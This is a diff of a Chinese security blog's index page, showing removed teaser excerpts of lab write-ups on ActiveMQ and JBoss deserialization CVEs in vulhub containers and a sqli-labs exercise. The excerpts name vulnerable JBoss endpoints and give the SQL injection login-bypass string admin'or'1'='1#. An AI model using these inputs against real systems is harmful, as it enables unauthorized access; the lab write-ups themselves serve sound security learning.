-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub&#x2F;activemq&#x2F;CVE-2015-5254&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>环境运行后，将监听<code>61616</code>和<code>8161</code>两个端口。其中<code>61616</code>是工作端口，消息在这个端口进行传递；<code>8161</code>是Web管理页面端口。访问<code>http://your-ip:8161</code>即可看到web管理页面，不过这个漏洞理论上是不需要web的。</p>
-<p><img src="https://qiniu.hzktester.top/tp2020101001.png" alt="image"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞利用过程如下：</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/10/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7504%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="hzktester">
-      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hzktester`s Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/10/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7504%EF%BC%89/" class="post-title-link" itemprop="url">JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</a>
-        </h2>
-
-        <div class="post-meta">
-			
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-09 17:14:00" itemprop="dateCreated datePublished" datetime="2020-10-09T17:14:00+08:00">2020-10-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-19 21:02:51" itemprop="dateModified" datetime="2020-10-19T21:02:51+08:00">2020-10-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>524</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><code>Red Hat JBoss Application Server</code>是一款基于<code>JavaEE</code>的开源应用服务器。<code>JBoss AS 4.x</code>及之前版本中，<code>JbossMQ</code>实现过程的<code>JMS over HTTP Invocation Layer</code>的<code>HTTPServerILServlet.java</code>文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
-<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>环境启动后，目标为<code>http://your-ip:8080</code>。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>/jbossmq-httpil/HTTPServerILServlet</code></p>
-<p>返回<code>This is the JBossMQ HTTP-IL</code>，说明页面存在，此页面存在反序列化漏洞。</p>
-<p><img src="https://qiniu.hzktester.top/tp2020100907.png" alt="image"></p>
-<p>这里直接利用<code>CVE-2017-12149</code>生成的ser，发送到<code>/jbossmq-httpil/HTTPServerILServlet</code>接口中</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/10/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-7504%EF%BC%89/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss%205.x%206.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="hzktester">
-      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hzktester`s Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/10/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss%205.x%206.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89/" class="post-title-link" itemprop="url">JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</a>
-        </h2>
-
-        <div class="post-meta">
-			
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-09 16:56:00" itemprop="dateCreated datePublished" datetime="2020-10-09T16:56:00+08:00">2020-10-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-19 21:02:54" itemprop="dateModified" datetime="2020-10-19T21:02:54+08:00">2020-10-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>783</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>该漏洞为<code>Java</code>反序列化错误类型，存在于<code>Jboss</code>的<code>HttpInvoker</code>组件中的 <code>ReadOnlyAccessFilter</code>过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>漏洞影响5.x和6.x版本的JBOSSAS</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>首次执行时会有1~3分钟时间初始化，初始化完成后访问<code>http://your-ip:8080/</code>即可看到<code>JBoss</code>默认页面。</p>
-<p><img src="https://qiniu.hzktester.top/tp2020100901.png" alt="image"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>/invoker/readonly</code>，返回500，说明页面存在，此页面存在反序列化漏洞。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/10/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/JBoss%205.x%206.x%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12149%EF%BC%89/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://hzktester.top/2020/10/04/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess11-16(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="hzktester">
-      <meta itemprop="description" content="偷偷努力，然后惊艳所有人">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hzktester`s Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/10/04/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess11-16(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/" class="post-title-link" itemprop="url">sqli-labs靶场Less11-16(二次注入)</a>
-        </h2>
-
-        <div class="post-meta">
-			
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-10-04 23:29:00" itemprop="dateCreated datePublished" datetime="2020-10-04T23:29:00+08:00">2020-10-04</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-19 21:01:03" itemprop="dateModified" datetime="2020-10-19T21:01:03+08:00">2020-10-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sqli-labs%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">sqli-labs靶场</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.8k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Less11"><a href="#Less11" class="headerlink" title="Less11"></a>Less11</h2><p>这一关开始使用post注入，什么是post注入呢？</p>
-<blockquote>
-<p> 就是数据从客户端提交<br>到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交，<br>提交到服务器后服务器再进行验证。这就是一次 post 的过程的。</p>
-</blockquote>
-<p>当我们输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin&#39;</span><br><span class="line">Password:ddd(任意值)</span><br></pre></td></tr></table></figure>
-<p><img src="https://qiniu.hzktester.top/tp2020100404.png" alt="image"></p>
-<p>显示错误了，可以从错误中分析到程序对参数进行单引号的处理。<br>这里我们可以在输入框输入万能密码来尝试一下。</p>
-<p>这里<code>username</code>输入：<code>admin&#39;or&#39;1&#39;=&#39;1#</code>，密码随意</p>
-<p><img src="https://qiniu.hzktester.top/tp2020100405.png" alt="image"></p>
-<p>返回的正确的结果，那么原因是什么呢？我们在<code>background-1</code>中已经其实提到了，逻辑运算的部分中已经讲解了原理。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/10/04/sqli-labs%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BALess11-16(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1550,7 +1516,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">52</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1623,12 +1589,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">67k</span>
+    <span title="站点总字数">69k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:01</span>
+    <span title="站点阅读时长">1:03</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
